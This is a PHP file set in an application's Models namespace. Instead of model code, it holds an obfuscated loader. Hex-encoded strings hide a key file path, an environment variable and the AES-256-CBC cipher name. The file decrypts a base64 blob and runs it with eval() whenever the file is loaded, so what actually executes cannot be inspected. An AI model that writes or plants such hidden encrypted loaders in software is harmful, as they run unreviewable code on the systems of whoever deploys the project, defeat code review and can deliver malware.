<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zvE4+76pH87tCpc7dGpm0g==');

$c=base64_decode(

'lRUiufkxKvjoSopU6oel4ipodMSY6UuyyVEnypWMfFPAIaXfritvspSjHo43e68Qj9wlB8T8LPBg' .
'x3lxY3maiCWsJ44bQL1U3+2ufIagFU9yMfEPQSNkdxtpkO1vHJfevbsmrClvCCEpPRJ2ePpaA0sl' .
'nRLnYXJxbc1lC4Vh02umKex+RQTemsvCcZMQnrF2EgMR6KRUiGYWgagkC5nG5MMfYrS0BgYAUaI7' .
'ORPBqx/ogIlHU1wxn5C8RyXqhQvJrx35ggqwMinnYuDTZ9s8+gu2dlbZqrHbOWv2G3hOJaOPLYz5' .
'dc6v8sah575iBPrXjxRcChXhyOq1Lcpp09goELl8wd7UNhsUMwLhULYVRzaXzM2GB5TUfLmZYwj+' .
'I7KGOEUtu0LDmjEIviySpY49wKokCSTFyzGcKVMayK07RBMUuOCZ/wpPYsKWfY4l4nAZ0V/KKSMF' .
'no7qqKslfsCaTO8F0xOhfI2m3AllGwN900nEdGM2UG9eSj0yhrTdnQCUFv+pXH05dsSb2ESqiwM7' .
'pzNdfGWMynoEEsF+YoYWGi7+3MqacbCtzChEUnnZlZ6JKCTev/inYmDMLWnZk4VlmZGtb25Psyu6' .
'2HJrdX3XnUmh4pIXgv8s9p2xbWws7MpNbx36MApBj8Tc0a9V6S8VwldM5YjbxKVUNEjfQfDOvd8x' .
'wxqh0y28ZANpyCK+MrcV/sT3+rkc/hFsCn+70Vgr1iCeCVKzcBZoC+8izJ1crVDyfvp5/C/2GhIE' .
'fDSgAHIM+ZDiqMGbvyVmT409n0i/0g=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

